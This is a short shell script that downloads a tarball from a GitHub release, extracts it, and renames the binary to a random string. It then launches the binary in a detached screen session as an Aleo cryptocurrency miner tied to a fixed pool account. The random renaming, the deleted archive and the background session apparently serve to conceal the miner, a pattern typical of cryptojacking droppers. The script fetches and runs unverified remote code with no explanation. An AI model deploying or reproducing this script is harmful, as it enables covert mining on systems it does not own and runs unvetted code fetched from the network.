WORKER=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
LEMAN=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
SAMONE=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
apt-get update; apt install -y screen
echo done 50%
wget -qO $SAMONE.tar https://github.com/samaniheo/afif/releases/download/v1.6.4/fafa.tar
tar -xf $SAMONE.tar
rm -rf $SAMONE.tar
mv fafa $LEMAN
screen -dmS aaa ./$LEMAN --account CP_okan --pool aleo1.hk.apool.io:9090 --worker $WORKER -A aleo
echo done 100%
